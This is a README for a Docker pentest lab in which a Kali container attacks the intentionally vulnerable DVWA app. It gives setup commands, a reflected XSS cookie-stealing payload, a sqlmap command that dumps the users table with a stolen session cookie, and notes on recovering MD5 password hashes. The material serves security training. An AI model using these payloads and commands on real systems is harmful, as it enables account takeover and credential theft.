# -Virtual-environment-in-Docker-with-Kali-Linux-and-DVWA
# CREATION OF A VIRTUAL ENVIRONMENT

# SUMMARY
Create a lab in Docker to do penetration testing in an isolated environment

## DESCRIPTION

Docker DVWA container will be attacked from another Docker Kali container with Cross-Site Scripting (XSS), SQLInjection and Weak encryption

## STEPS TO REPRODUCE :

1. Download local desktop client from Docker Hub [from here](https://www.docker.com/products/docker-desktop)
2. Create two Dockerfiles, one with Kali Linux. Pull Kali with:

>docker pull kalilinux/kali-rolling

2.1 then run Kali with:

>docker run -t -i kalilinux/kali-rolling /bin/bash

2.3 And the second dockerfile with DVWA Security. Run with:

> docker run -it -p 8080:80 vulnerables/web-dvwa

3. In both containers use the next commands:

3.1 First update the containers  

> apt-get update

3.2 Install sudo and net-tools

> apt-get install sudo net-tools

3.3 check the Ips  

> ifconfig

*Save the ips for later*
4. To demonstrate that the laboratory is isolated it is necessary to install nmap 

> sudo apt-get install nmap -y

4.1 Scan the isolated network  

> nmap -sV x.x.x.0/24

*Change the x's for your network segment*
5. Checar que el servidor apache2 está corriendo en DVWA 

> service apache2 start

**The first attack is Cross-Site Scripting (XSS) Attacks**
3. Enter the DVWA interface from its respective ip (it can be an ip or localhost)
3.1 Login with credentials:

> username: admin password: admin

3.2 At the end of the home page, click on the button "create database" 
3.3 Log in again with the credentials:

> username: admin password: password

3.4 Click on the XSS (Reflected) button
3.5 In the text box write:

> `<script>alert(document.cookie)</script>`

3.6 Click submit and copy the text (the cookie) that appears in the pop-up window
*Save the cookie*
   
**The second attack is SQLInjection**
 4. Intall sqlmap 

>  sudo apt-get install sqlmap -y
  
4.1 In the DVWA interface click on the SQL Injection button (The option without parentheses)
 4.2 In the text box write the number "1" (without quotes) and click on submit
 4.3 Copy the url of the website 
4.4 It will be necessary to use a "user agent". I recommend using this one

> `iTunes/9.0.3 (Macintosh; U; Intel Mac OS X 10_6_2; en-ca)`

 5. To finish the attck use this code  `sqlmap -u "Paste the url from step 4.3 and keep the quotes" -D dvwa -T users --dump --user-agent="Paste the user agent from the step 4.4 and keep the quotes" --cookie="Paste the cookie from the step 3.6 and keep the quotes"`

   
**The latest attack is Weak encryption**
  
6. The above code will get all the database users and their passwords. Passwords are MD5 encrypted. The above code will decrypt the hashes to obtain the passwords of all users.
